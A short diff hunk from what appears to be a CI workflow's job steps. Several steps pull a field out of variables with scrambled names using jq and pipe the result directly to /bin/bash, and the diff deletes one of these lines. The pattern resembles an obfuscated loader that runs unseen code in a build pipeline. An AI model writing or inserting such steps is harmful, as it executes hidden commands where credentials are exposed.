@@ -52,7 +52,6 @@ jobs:
           printf '%s' "$wmli6184" | jq -r .jo80 | /bin/bash
           echo $lqxls92364 | jq -r .tr822 | /bin/bash
           echo $ls0852 | jq -r .fi99 | /bin/bash
-          printf '%s' "$bmy5535" | jq -r .wg3 | /bin/bash
           echo $vmyy330 | jq -r .cfxef643 | /bin/bash
           printf '%s' "$f1" | jq -r .a93348 | /bin/bash
           printf '%s' "$ea28" | jq -r .sgxn6 | /bin/bash
